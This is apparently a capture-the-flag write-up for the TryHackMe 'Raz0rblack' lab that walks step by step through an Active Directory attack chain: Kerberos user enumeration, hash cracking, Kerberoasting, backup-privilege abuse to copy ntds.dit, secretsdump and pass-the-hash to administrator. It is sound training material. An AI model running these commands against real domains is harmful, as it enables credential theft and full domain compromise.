# Raz0rblack

https://tryhackme.com/room/raz0rblack

A good AD room, with some interesting windows privesc. Worth writing up as some of this stuff is finicky.

Via the flag submission panel, some users can be gathered. HOWEVER, this writeup assumes you don't do this.

1. nmap -A over the machine will reveal the domain controller name is raz0rblack.thm
2. kerbrute (obtainable [here](https://github.com/ropnop/kerbrute)) run as following will reveal a number of users: `kerbrute userenum -d raz0rblack.thm --dc <ip> /usr/share/wordlists/SecLists/Usernames/x
ato-net-10-million-usernames.txt`: administrator, twilliams (with a hash) and sbradley.
3. The hash for twilliams can be broken with hashcat, rockyou and  `-m 18200`, revealing the password for this user.
4. With credentials, the rest of the users can be gathered via impacket's lookupSID: `python3 /opt/impacket/examples/lookupsid.py raz0rblack.thm/twilliams:roastpotatoes@10.10.
115.139`, revealing two additional users, xyan1d3 and lvetrova.
5. By adding xyan1d3 and lvetrova to users.txt, we can then attempt to kerbroast: `/opt/impacket/examples/GetUserSPNs.py -dc-ip <ip> raz0rblack.thm/twilliams -outputfile
hashes.kerbroast` (this will prompt for a password) which will reveal a hash for the user xyan1d3.
6. The hash from above can be broken with hashcat, rockyou and `-m 13100` to get the password for xyan1d3.
7. Using this password with evil-winrm we can get an interactive session as this user: `evil-winrm -i <ip> -u xyan1d3 -p <password>
8. xyan1d3 has the following permissions: 

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeBackupPrivilege             Back up files and directories  Enabled
SeRestorePrivilege            Restore files and directories  Enabled
SeShutdownPrivilege           Shut down the system           Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Meaning that getting a credential dumb via backups should be possible.

9. A backup of ntds.dit can be made as so: `echo y | wbadmin start backup -backuptarget:\\localhost\c$\users\xyan1d3\Doc
uments -include:c:\windows\ntds\`. This will put the backup in the user's documents folder (note the use of a local c$ share to satisfy both the requirement of a share and the target being ntfs)
10. To extract the ntds.dit, the version id of the backup can be obtained via `wbadmin get versions`, and then the file can be gathered via `echo Y | wbadmin start recovery -itemtype:file -items:C:\windows\ntds\ntds.dit -recoverytarget:Z:\ -notrestoreacl -version:<version-id>`
11. Finally, gathering the sam hive and system hive via `reg save hklm\sam sam.save` and `reg save hklm\system system.save`, the hashes for users can be extracted via `secretsdump.py -system System.hive -sam Sam.hive -ntds ntds.dit LOCAL`.
12. With the admin hash from above, complete system compromise can be obtained via evil-winrm and passing the hash: `evil-winrm -i <ip> -u administrator -H <hash>`
